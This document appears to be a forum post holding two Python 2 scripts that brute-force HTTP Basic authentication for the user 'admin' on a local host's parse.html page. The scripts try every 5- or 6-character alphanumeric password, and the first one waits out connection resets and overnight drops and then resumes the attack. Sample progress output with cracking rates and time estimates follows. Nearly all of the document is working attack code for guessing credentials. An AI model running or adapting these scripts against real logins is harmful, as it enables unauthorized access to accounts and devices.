import socket
import urllib2, base64
import sys
import time


def afunction(password_start):

    #-------------------------------------------------------------------------- ONLY ONCE
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    request = urllib2.Request("http://192.168.178.25/parse.html")
    num = len(charset)**3
    print "Trying to crack parse.html...\n"

    # STATUS VARIABLES
    totspeed = 0
    c= 0
    total = 36**6

    #GET THE INDEXES TO START WHERE THEY SHOULD
    first_time = True

    ilist = []
    for i in password_start:
        for index, j in enumerate(charset):
            if i == j:
                ilist.append(index)

    #USERNAME
    usrname = 'admin'

    #-------------------------------------------------------------------------- LOOP
    for idx, l in enumerate(charset):
        _q = idx
        if idx < ilist[0] and first_time:
            continue
        for idx2, m in enumerate(charset):
            _w = idx2
            if idx2 < ilist[1] and first_time:
                continue
            for idx3, n in enumerate(charset):
                _e = idx3
                if idx3 < ilist[2] and first_time:
                    continue
                at = time.time()
                for idx4,o in enumerate(charset):
                    if idx4 < ilist[3] and first_time:
                        continue
                    for idx5, p in enumerate(charset):
                        if idx5 < ilist[4] and first_time:
                            continue
                        for idx6, q in enumerate(charset):
                            if idx6 < ilist[5] and first_time:
                                continue

                            #PASSWORD
                            passwd = l+m+n+o+p+q
                            first_time = False

                            #LOGGING IN
                            base64string = base64.encodestring('%s:%s' % (usrname,passwd)).replace('\n', '')
                            request.add_header("Authorization", "Basic %s" % base64string)
                            try:
                                result = urllib2.urlopen(request)
                                print "Login succes!!  Username: %s"%usrname,"   Password: %s"%passwd
                                sys.exit()

                            #EVERY FAILED PASSWORD GOES IN HERE
                            except urllib2.HTTPError:
                                continue

                            #IF A NETWORK ERROR OCCURS, IT WILL BE CAUGHT WITH AN EXCEPTION
                            except socket.error:
                                print "\n Sleeping for a moment. Conncection is reset by peer...\n"
                                time.sleep(60)
                                afunction(passwd)


                            except urllib2.URLError:
                                if time.localtime()[3] < 21:
                                    print "Connection has been lost. Try again in 10 minutes"
                                    start3 = passwd
                                    time.sleep(600)
                                    afunction(passwd)

                                else:
                                    start3 = passwd
                                    print "Connection has been terminated at: %s\n"% time.ctime()
                                    print "Todays cracking ended with: %s"%start3
                                    print "Cracking will continue at 6 AM\n"
                                    while time.localtime()[3] != 6:
                                        time.sleep(600)
                                    time.sleep(300)
                                    afunction(passwd)

                #STATUS UPDATE
                bt = time.time()

                totpasswd = num/((bt-at))
                totspeed +=int(totpasswd)
                c+=1
                average = totspeed / c
                aa = (36-(_q+1) )
                bb = (36-(_w+1) )
                cc = (36-(_e+1) )
                if aa == 0: aa = 1
                if bb == 0: bb = 1
                if cc == 0: cc = 1
                passwordsleft = ( aa * 36**5) +( bb * 36**4) + ( cc * 36**3) + (36**3) + (36**2) + 36.
                estimatation = ((passwordsleft/average) / 3600 ) / 13.
                print usrname,"::::",l+m+n+'xxx',"::::", "  Processed %d passwords / sec"%totpasswd, "::::","  Estimated time left: %d days"%estimatation,"::::","  Passwords Left: %d"%passwordsleft, "::::","  Done: %.2f %%"%((passwordsleft/total)*100)

#RUN SCRIPT
afunction('aziaaa')
This is the output:

admin :::: fajxx ::::   Processed 737 passwords / sec ::::   Estimated time left: 25 hours ::::   Passwords Left: 52056468 ::::   Done: 13.91 %
admin :::: fakxx ::::   Processed 648 passwords / sec ::::   Estimated time left: 25 hours ::::   Passwords Left: 52055172 ::::   Done: 13.91 %
admin :::: falxx ::::   Processed 848 passwords / sec ::::   Estimated time left: 24 hours ::::   Passwords Left: 52053876 ::::   Done: 13.91 %
admin :::: famxx ::::   Processed 734 passwords / sec ::::   Estimated time left: 23 hours ::::   Passwords Left: 52052580 ::::   Done: 13.91 %
EDIT: Following is a similar code, but then with the httlip library.

import sys
import time
import base64
import string
import httplib

def afunction(password_start):

    #-------------------------------------------------------------------------- ONLY ONCE
    charset = 'abcdefghijklmnopqrstuvwxyz0123456789'
    h = httplib.HTTP('192.168.178.25')
    num = len(charset)**2
    print "Trying to crack parse.html...\n"

    # STATUS VARIABLES
    totspeed = 0
    c= 0
    total = 36**5

    #GET THE INDEXES TO START WHERE THEY SHOULD
    first_time = True

    ilist = []
    for i in password_start:
        for index, j in enumerate(charset):
            if i == j:
                ilist.append(index)

    #USERNAME
    userid = 'admin'

    #-------------------------------------------------------------------------- LOOP
    for idx, l in enumerate(charset):
        _q = idx
        if idx < ilist[0] and first_time:
            continue
        for idx2, m in enumerate(charset):
            _w = idx2
            if idx2 < ilist[1] and first_time:
                continue
            for idx3, n in enumerate(charset):
                _e = idx3
                if idx3 < ilist[2] and first_time:
                    continue
                at = time.time()
                for idx4,o in enumerate(charset):
                    if idx4 < ilist[3] and first_time:
                        continue
                    for idx5, p in enumerate(charset):
                        if idx5 < ilist[4] and first_time:
                            continue

                        #PASSWORD
                        passwd = l+m+n+o+p
                        first_time = False

                        auth = 'Basic ' + string.strip(base64.encodestring(userid + ':' + passwd))

                        h.putrequest('GET', '/parse.html')
                        h.putheader('Authorization', auth )
                        h.endheaders()
                        if h.getreply()[0] == 401:
                            continue
                        elif h.getreply()[0] == 200:
                            print "Login succes!!  Username: %s"%userid,"   Password: %s"%passwd
                            sys.exit()
                        else:
                            print "Conncection lost..."
                            sys.exit()

                #STATUS UPDATE
                bt = time.time()
                dt = bt - at
                totpasswd = num/dt
                totspeed +=int(totpasswd)
                c+=1.
                average = totspeed / c
                aa = (36-(_q+1) )
                bb = (36-(_w+1) )
                cc = (36-(_e+1) )
                if aa == 0: aa = 1
                if bb == 0: bb = 1
                if cc == 0: cc = 1
                passwordsleft = ( aa * 36**4) +( bb * 36**3) + ( cc * 36**2) + (36**2) + 36.
                estimatation = ((passwordsleft/average) / 3600. )
                print userid,"::::",l+m+n+'xx',"::::", "  Processed %d passwords / sec"%totpasswd, "::::","  Estimated time left: %d hours"%estimatation,"::::","  Passwords Left: %d"%passwordsleft, "::::","  Done: %.2f %%"%(100-(((passwordsleft/total))*100))

    print "No password found.. Try something else.... "

#RUN SCRIPT
afunction('aaiaa')
#afunction('a47aaa')
